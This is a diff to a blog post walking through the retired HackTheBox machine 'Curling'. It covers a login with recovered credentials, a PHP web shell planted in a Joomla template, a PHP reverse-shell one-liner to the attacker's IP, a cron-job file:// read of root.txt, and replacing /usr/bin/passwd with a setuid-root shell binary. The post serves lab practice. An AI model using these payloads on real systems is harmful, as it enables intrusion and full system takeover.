@@ -12,6 +12,8 @@ tags:
     - linux
 ---
 
+For all the beginners and the people who wish to nail all the machines on HackTheBox, this machine is a great starter. It has a flavor of shell upload to web, some CTF style problems and classic cron job privilege escalation. Overall a fun machine.
+
 ![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/banner.JPG)
 
 Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)
@@ -19,7 +21,7 @@ Before following this walkthrough, I highly recommend trying to get the flag you
 First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).
 
 ```bash
-root@noone:/home/pswapnil/Curling# nmap -v -sC -sV -p- -oA nmap 10.10.10.150
+root@kali:~/Curling# nmap -v -sC -sV -p- -oA nmap 10.10.10.150
 # Nmap 7.70 scan initiated Sat Feb  2 22:09:43 2019 as: nmap -v -sC -sV -p- -oA nmap 10.10.10.150
 Nmap scan report for 10.10.10.150
 Host is up (0.26s latency).
@@ -73,7 +75,7 @@ Probably a file in the root directory? Let's check it out.
 Looks like base64. Let's try to decode it.
 
 ```bash
-root@noone:/home/pswapnil/Retired/Curling# cat secret.txt | base64 -d
+root@kali:~/Curling# cat secret.txt | base64 -d
 Curling2018!
 ```
 
@@ -81,11 +83,30 @@ Well, probably a password? Let's navigate to the `administrator` page. A little 
 
 ![admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/admin.png)
 
+I used `Floris:Curling2018!` to login to the administrator page and we can login! We get this page...
+
+![admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/login.png)
+
+A little Google-Fu helped me find where I could upload files and get a shell. I am going to use the `Beez3` template.
+
+![admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/template.png)
+
+I will create a new file in the root directory `shell.php` and write a simple php script that takes in a parameter and runs it through `system()`. Let's see if it works.
+
+![admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/shell.png)
+
+The file uploaded successfully. It can be accessed at `/templates/beez3/shell.php`
+I am going to try the command `id` in the parameter that we created.
+
+![admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/cmdexec.png)
+
+And we have command execution. Next step is to get a shell. For that, I will use `php -r '$sock=fsockopen("<my-ip>",9001);exec("/bin/sh -i <&3 >&3 2>&3");'` to connect to a `ncat` listener running on my system. I am going to URL encode this just in case the browser does not take `&` as a start of a new command.
+There we have it, a low-privilege shell.
 
 ```bash
-root@noone:/home/pswapnil/Retired/Curling# nc -lnvp 9001
+root@kali:~/Curling# nc -lnvp 9001
 listening on [any] 9001 ...
-connect to [10.10.16.39] from (UNKNOWN) [10.10.10.150] 53762
+connect to [my-ip] from (UNKNOWN) [10.10.10.150] 53762
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
@@ -115,13 +136,15 @@ $ cat password_backup
 000000f0: 819b bb48                                ...H
 ```
 
+Looking aroud, we have access as `www-data` and in the home directory of the user `floris`, I see a `password_backup` file.
 I created a base64 output of the hexdump and used CyberChef to try and decode it.
 
+![admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/cyberchef.png)
 
 It gave me a password `5d<wdCbdZu)|hChXll`. Let's use this password to login as `floris` using SSH.
 
 ```bash
-root@noone:~/Curling# ssh floris@10.10.10.150
+root@kali:~/Curling# ssh floris@10.10.10.150
 The authenticity of host '10.10.10.150 (10.10.10.150)' can't be established.
 ECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -153,6 +176,8 @@ admin-area  password_backup  user.txt
 floris@curling:~$ cat user.txt
 6******************************b
 ```
+
+Excellent! We have the `user.txt` file. Now, onto root.
 
 ````bash
 floris@curling:~/admin-area$ ls -la
@@ -188,8 +213,38 @@ floris@curling:~/admin-area$
 </html>
 ````
 
+Looks like `root` is writing the `input` and `report` file and we can edit them. So, the content of report changes based on the `url` field in the input file. Let's try to use `file://` instead of `http://` and get root.
+
 ```bash
 floris@curling:~/admin-area$ echo 'url = "file:///root/root.txt"' > input
 floris@curling:~/admin-area$ cat report
 8******************************a
 ```
+
+There we have it, the `root.txt` file. In order to get a shell as root, we could upload a `setuid` bit set executable and replace an executable owned by root and execute it through the user.
+I wrote a small script and compiled it on my machine and started an http server so that I could access it from the box.
+
+```c
+void main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/sh","sh",0);
+}
+```
+
+I am going to replace the `/usr/bin/passwd` executable.
+
+```yaml
+url = "http://<my-ip>/getroot"
+output = /usr/bin/passwd
+```
+
+```bash
+floris@curling:/$ /usr/bin/passwd
+# id
+uid=0(root) gid=0(root) groups=0(root),1004(floris)
+```
+
+Awesome! We have a shell as root. Absolute fun box.
+
+Happy Hacking! Cheers!
